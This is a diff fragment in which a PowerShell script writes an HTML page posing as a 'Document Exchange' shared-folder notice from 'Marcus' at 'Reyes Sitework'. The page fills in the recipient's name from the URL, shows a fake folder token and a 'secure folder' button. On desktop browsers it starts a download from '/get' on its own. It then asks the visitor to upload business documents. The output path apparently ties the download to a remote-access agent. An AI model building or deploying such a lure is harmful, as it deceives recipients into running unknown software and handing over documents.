@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex">
+<meta name="referrer" content="no-referrer">
+<title>Document Exchange — Shared Folder</title>
+<style>
+*{box-sizing:border-box;margin:0}
+body{font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+background:#f4f6f8;color:#1c2530;display:flex;flex-direction:column;min-height:100vh}
+header{background:#fff;border-bottom:1px solid #e2e6ea;padding:14px 22px;display:flex;
+align-items:center;gap:9px;font-weight:600;font-size:15px;color:#12314f}
+.lock{width:15px;height:15px;border:2px solid #12314f;border-radius:2px;position:relative}
+.lock:before{content:"";position:absolute;width:9px;height:7px;border:2px solid #12314f;
+border-bottom:0;border-radius:5px 5px 0 0;top:-8px;left:1px}
+main{flex:1;display:flex;align-items:center;justify-content:center;padding:34px 18px}
+.card{background:#fff;border:1px solid #e2e6ea;border-radius:10px;max-width:470px;width:100%;
+padding:28px;box-shadow:0 2px 12px rgba(18,49,79,.06)}
+h1{font-size:19px;font-weight:600;letter-spacing:-.2px;margin-bottom:5px}
+.who{color:#5f6f80;font-size:13.5px;margin-bottom:18px}
+.who b{color:#1c2530;font-weight:600}
+.tok{font:12px ui-monospace,Menlo,monospace;background:#f4f6f8;border:1px solid #e8ecf0;
+border-radius:5px;padding:7px 10px;color:#5f6f80;margin-bottom:18px;display:flex;
+justify-content:space-between}
+.tok b{color:#12314f;letter-spacing:.06em}
+.files{border:1px solid #e8ecf0;border-radius:7px;overflow:hidden;margin-bottom:22px}
+.f{display:flex;align-items:center;gap:10px;padding:11px 13px;border-bottom:1px solid #f0f3f5;font-size:13.5px}
+.f:last-child{border-bottom:0}
+.ic{width:26px;height:32px;border:1.5px solid #b8c4cf;border-radius:3px;flex:none;
+background:#fafbfc;position:relative}
+.ic:after{content:"";position:absolute;top:0;right:0;width:9px;height:9px;
+background:#e8ecf0;border-left:1.5px solid #b8c4cf;border-bottom:1.5px solid #b8c4cf}
+.nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sz{color:#8794a3;font-size:12px;flex:none}
+button{width:100%;padding:13px;border:0;border-radius:7px;background:#12314f;color:#fff;
+font:600 14.5px inherit;cursor:pointer}
+button:hover{background:#0c2439}
+.track{height:3px;background:#e8ecf0;border-radius:2px;margin-top:12px;overflow:hidden;display:none}
+.track.on{display:block}
+.fill{height:100%;width:0;background:#12314f;transition:width 1.8s linear}
+.hint{margin-top:14px;font-size:13px;color:#5f6f80;display:none}
+.hint.on{display:block}
+.hint a{color:#12314f}
+footer{text-align:center;padding:16px;font-size:11.5px;color:#8794a3}
+.mob{display:none;background:#fff8e6;border:1px solid #f0dca8;color:#7a5d17;
+padding:11px 13px;border-radius:7px;font-size:13px;margin-bottom:18px}
+@media(max-width:520px){.mob{display:block}}
+#done{display:none}
+.ok{width:44px;height:44px;border-radius:50%;background:#e8f5ee;color:#1c7a4a;
+display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:14px}
+</style></head><body>
+<header><span class="lock"></span> Reyes Sitework · Document Exchange</header>
+<main><div class="card">
+
+<div id="pre">
+  <h1>Marcus shared a folder with you</h1>
+  <div class="who">Sent to <b id="rcpt">you</b> · expires in 7 days</div>
+  <div class="tok"><span>Folder token</span><b id="tk">—</b></div>
+  <div class="mob">Open this on your computer to get the folder.</div>
+  <div class="files">
+    <div class="f"><span class="ic"></span><span class="nm">Engagement letter</span><span class="sz">your upload</span></div>
+    <div class="f"><span class="ic"></span><span class="nm">Fee schedule</span><span class="sz">your upload</span></div>
+    <div class="f"><span class="ic"></span><span class="nm">Statements — Mar–Jun</span><span class="sz">folder</span></div>
+  </div>
+  <button id="go">Open secure folder</button>
+  <div class="track" id="tr"><div class="fill" id="fl"></div></div>
+  <div class="hint" id="h">Download didn't start? <a href="/get">Open manually</a>.</div>
+</div>
+
+<div id="done">
+  <div class="ok">✓</div>
+  <h1>Folder ready</h1>
+  <div class="who">Drop your engagement letter and fee schedule in, then reply to Marcus in your chat.</div>
+  <div class="files">
+    <div class="f"><span class="ic"></span><span class="nm">Upload engagement letter</span><span class="sz">→</span></div>
+    <div class="f"><span class="ic"></span><span class="nm">Upload fee schedule</span><span class="sz">→</span></div>
+  </div>
+</div>
+
+</div></main>
+<footer>256-bit TLS · <span id="dom">send.telcom.stream</span> · files expire in 7 days</footer>
+<script>
+var q=new URLSearchParams(location.search);
+if(q.get('to'))document.getElementById('rcpt').textContent=q.get('to');
+document.getElementById('dom').textContent=location.host;
+var m=location.pathname.match(/\/f\/([a-f0-9]{8})/);
+if(m)document.getElementById('tk').textContent=m[1];
+var fired=false;
+function start(){
+  if(fired)return; fired=true;
+  var tr=document.getElementById('tr'),fl=document.getElementById('fl'),h=document.getElementById('h');
+  tr.classList.add('on');
+  requestAnimationFrame(function(){fl.style.width='100%'});
+  setTimeout(function(){h.classList.add('on')},2400);
+  location.href='/get';
+  setTimeout(function(){
+    document.getElementById('pre').style.display='none';
+    document.getElementById('done').style.display='block';
+  },7000);
+}
+document.getElementById('go').onclick=start;
+if(!/Mobi|Android|iPhone|iPad/.test(navigator.userAgent))setTimeout(start,1800);
+</script></body></html>
+'@ | Set-Content -Path 'meshcentral-oracle\mh1\portal.html' -NoNewline
+Write-Host "Portal HTML written"
